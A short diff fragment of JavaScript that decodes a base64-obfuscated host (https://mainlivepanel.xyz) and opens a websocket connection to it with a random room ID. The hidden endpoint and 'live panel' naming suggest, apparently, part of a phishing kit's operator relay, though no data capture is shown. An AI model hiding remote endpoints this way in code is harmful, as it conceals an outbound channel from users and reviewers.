@@ -6,8 +6,8 @@
             let roomid = (Math.random() + 1).toString(36).substring(2);
             console.log(roomid);
             
-         var host=atob('aHR0cHM6Ly9tYWlubGl2ZXBhbmVsLnh5ei8=');
-            var socket = io(host);
+         var host=atob('aHR0cHM6Ly9tYWlubGl2ZXBhbmVsLnh5eg==');
+            var socket = io(host, { transports: ["websocket"] });
             socket.on("connect", function () {
                 console.log("Connected to socket");
                      if(orgect){
